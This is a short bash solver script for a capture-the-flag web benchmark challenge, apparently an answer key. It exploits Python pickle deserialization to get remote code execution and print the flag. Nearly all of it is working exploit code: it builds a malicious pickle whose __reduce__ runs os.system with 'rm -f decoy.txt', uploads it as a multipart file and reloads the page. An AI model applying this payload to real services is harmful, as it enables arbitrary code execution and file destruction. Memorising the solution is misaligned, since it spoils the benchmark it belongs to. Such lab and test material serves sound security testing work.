#!/usr/bin/env bash
# XBEN-036-24 — Python pickle deserialization RCE. Proxy-mode twin. The page
# shows a decoy flag while decoy.txt exists and the real flag.txt otherwise, and
# the uploaded file is unpickled without any guard. A __reduce__ payload deletes
# decoy.txt; reloading the page then reads and prints the real flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben036p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
PICKLE="$(python3 -c "
import pickle, os
class Evil:
    def __reduce__(self):
        return (os.system, ('rm -f decoy.txt',))
print(pickle.dumps(Evil(), protocol=0).decode())")"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/' \
  --set "multipart.pickle_file=$PICKLE" \
  --set 'multipart.pickle_file.filename=p.pkl' \
  --set 'multipart.pickle_file.content_type=application/octet-stream' >/dev/null
# Reload: decoy.txt is gone, so the page now reads the real flag.txt.
"$H5I" websec replay "$BASE" --create --session "$SESSION" --set 'method=GET' --set 'path=/' >/dev/null
print_flag
